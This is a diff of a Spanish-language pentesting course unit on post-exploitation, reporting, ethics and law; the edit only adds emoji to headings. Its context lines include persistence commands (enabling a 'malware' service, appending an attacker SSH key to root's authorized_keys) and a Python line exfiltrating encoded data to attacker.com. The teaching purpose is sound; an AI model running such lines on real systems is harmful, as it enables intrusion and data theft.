@@ -1,6 +1,6 @@
-# Unidad 8: Post-Explotación, Reporte y Ética
+# 🎯 Unidad 8: Post-Explotación, Reporte y Ética
 
-## Objetivos de Aprendizaje
+## 🎯 Objetivos de Aprendizaje
 
 - **Ejecutar** técnicas de post-explotación y mantenimiento de acceso.
 - **Escalar** privilegios en sistemas comprometidos.
@@ -9,13 +9,13 @@
 
 ---
 
-## Contenido Teórico
+## 📚 Contenido Teórico
 
-### 8.1 Post-Explotación
+### 🛠️ 8.1 Post-Explotación
 
 La post-explotación abarca las actividades después de obtener acceso inicial: mantener acceso, escalar privilegios y exfiltrar datos.
 
-#### Persistence Mechanisms
+#### 🔐 Persistence Mechanisms
 
 **Windows**:
 
@@ -79,7 +79,7 @@ systemctl enable malware
 echo "ssh-rsa AAAA... user@attacker" >> /root/.ssh/authorized_keys
 ```
 
-#### Privilege Escalation
+#### ⬆️ Privilege Escalation
 
 **Linux**:
 - Kernel exploits
@@ -130,7 +130,7 @@ Invoke-AllChecks
 winpeas.exe
 ```
 
-#### Data Exfiltration
+#### 📤 Data Exfiltration
 
 **Técnicas**:
 
@@ -161,11 +161,11 @@ requests.post('https://attacker.com/exfil', data=encoded)
 
 ---
 
-### 8.2 Reportes
+### 📝 8.2 Reportes
 
 Un buen reporte es tan importante como el pentest mismo.
 
-#### Estructura de Reportes
+#### 📋 Estructura de Reportes
 
 **Reporte Ejecutivo** (1-3 páginas):
 
@@ -205,7 +205,7 @@ Un buen reporte es tan importante como el pentest mismo.
    - Screenshots
 ```
 
-#### Plantilla de Finding
+#### 📄 Plantilla de Finding
 
 ```markdown
 ## Finding: [Título]
@@ -237,7 +237,7 @@ Un buen reporte es tan importante como el pentest mismo.
 - [Best practices]
 ```
 
-#### Finding Prioritization
+#### ⚖️ Finding Prioritization
 
 **CVSS v3.1**:
 
@@ -257,11 +257,11 @@ Un buen reporte es tan importante como el pentest mismo.
 
 ---
 
-### 8.3 Marco Ético
+### ⚖️ 8.3 Marco Ético
 
 La ética en pentesting es fundamental para la profesión.
 
-#### Código de Ética del Pentester
+#### 📜 Código de Ética del Pentester
 
 **Principios**:
 
@@ -272,7 +272,7 @@ La ética en pentesting es fundamental para la profesión.
 5. **Competencia**: Solo realizar pruebas para las que está calificado
 6. **Profesionalismo**: Actuación honorable y honesta
 
-#### Responsabilidades Profesionales
+#### 📋 Responsabilidades Profesionales
 
 - Documentar todo el proceso
 - Mantener skills actualizados
@@ -280,7 +280,7 @@ La ética en pentesting es fundamental para la profesión.
 - Colaborar con defensores
 - No facilitar actividades ilegales
 
-#### Responsible Disclosure
+#### 🔓 Responsible Disclosure
 
 1. Reportar al vendor/interno
 2. Dar tiempo para remediar (típicamente 90 días)
@@ -289,9 +289,9 @@ La ética en pentesting es fundamental para la profesión.
 
 ---
 
-### 8.4 Marco Legal
+### ⚖️ 8.4 Marco Legal
 
-#### Legislación Española
+#### 🇪🇸 Legislación Española
 
 **Ley Orgánica 10/1995 (Código Penal)**:
 
@@ -316,7 +316,7 @@ La ética en pentesting es fundamental para la profesión.
 - Administraciones Públicas
 - Incidentes de seguridad en sector público
 
-#### GDPR (Reglamento General de Protección de Datos)
+#### 🇪🇺 GDPR (Reglamento General de Protección de Datos)
 
 - **Artículos clave**:
   - 32: Seguridad del tratamiento
@@ -325,7 +325,7 @@ La ética en pentesting es fundamental para la profesión.
 
 - **Sanciones**: Hasta 20M€ o 4% facturación global
 
-#### Contratos de Pentesting
+#### 📝 Contratos de Pentesting
 
 **Elementos esenciales**:
 
@@ -340,7 +340,7 @@ La ética en pentesting es fundamental para la profesión.
 
 ---
 
-## Herramientas
+## 🛠️ Herramientas
 
 | Herramienta | Propósito | Instalación |
 |-------------|-----------|-------------|
@@ -356,7 +356,7 @@ La ética en pentesting es fundamental para la profesión.
 
 ---
 
-## Proyecto Final
+## 🎯 Proyecto Final
 
 > Ver [`labs/lab-unidad8.md`](../labs/lab-unidad8.md) para el escenario completo.
 
@@ -371,7 +371,7 @@ La ética en pentesting es fundamental para la profesión.
 
 ---
 
-## Recursos Adicionales
+## 📚 Recursos Adicionales
 
 - [Cobalt Strike Documentation](https://www.cobaltstrike.com/help) — Documentación oficial del framework C2 comercial
 - [Empire Framework](https://github.com/EmpireProject/Empire) — Framework C2 post-explotación open source
@@ -382,7 +382,7 @@ La ética en pentesting es fundamental para la profesión.
 
 ---
 
-## Evaluación
+## 📊 Evaluación
 
 La evaluación de esta unidad sigue la ponderación canónica del curso:
 
@@ -396,7 +396,7 @@ El Proyecto Final integra todas las competencias desarrolladas a lo largo del cu
 
 ---
 
-## Bibliografía
+## 📖 Bibliografía
 
 - [PTES Reporting Guidelines](http://www.pentest-standard.org/index.php/Reporting)
 - [NIST SP 800-115: Technical Guide to Info Sec Testing](https://csrc.nist.gov/publications/detail/sp/800/115/final)
